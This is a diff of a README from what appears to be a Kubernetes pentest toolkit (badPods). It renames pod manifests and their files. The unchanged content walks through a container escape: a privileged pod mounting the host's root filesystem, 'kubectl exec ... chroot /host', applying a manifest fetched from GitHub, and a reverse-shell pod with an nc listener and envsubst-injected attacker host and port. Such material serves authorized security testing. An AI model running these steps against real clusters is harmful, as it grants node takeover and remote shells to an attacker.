@@ -10,7 +10,7 @@ The pod you create mounts the host's filesystem to the pod. You then exec into y
 apiVersion: v1
 kind: Pod
 metadata:
-  name: pod-everything-allowed
+  name: everything-allowed
   labels:
     app: pentest
 spec:
@@ -33,21 +33,21 @@ spec:
     hostPath:
       path: /
 ```
-[pod-everything-allowed.yaml](pod-everything-allowed.yaml)
+[everything-allowed.yaml](everything-allowed.yaml)
 
 #### Option 1: Create pod from local yaml 
 ```bash
-kubectl apply -f pod-everything-allowed.yaml 
+kubectl apply -f everything-allowed.yaml 
 ```
 
 #### Option 2: Create pod from github hosted yaml
 ```bash
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/everything-allowed/pod-everything-allowed.yaml 
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/everything-allowed/everything-allowed.yaml 
 ```
 
 #### Exec into pod 
 ```bash
-kubectl exec -it pod-everything-allowed -- chroot /host
+kubectl exec -it everything-allowed -- chroot /host
 ```
 
 ## Or, create a reverse shell pod
@@ -55,7 +55,7 @@ kubectl exec -it pod-everything-allowed -- chroot /host
 apiVersion: v1
 kind: Pod
 metadata:
-  name: pod-everything-allowed-revshell
+  name: everything-allowed-revshell
   labels:
     app: pentest
 spec:
@@ -78,7 +78,7 @@ spec:
     hostPath:
       path: /
 ```
-[pod-everything-allowed-revshell.yaml](pod-everything-allowed-revshell.yaml)
+[everything-allowed-revshell.yaml](everything-allowed-revshell.yaml)
 
 #### Set up listener
 ```bash
@@ -88,7 +88,7 @@ nc -nvlp 3116
 #### Create the pod
 ```bash
 # Option 1: Create pod from local yaml without modifying it by using env variables and envsubst
-HOST="10.0.0.1" PORT="3116" envsubst < ./yaml/everything-allowed/pod-everything-allowed-revshell.yaml | kubectl apply -f -
+HOST="10.0.0.1" PORT="3116" envsubst < ./yaml/everything-allowed/everything-allowed-revshell.yaml | kubectl apply -f -
 ```
 
 #### Catch the shell and chroot to /host 
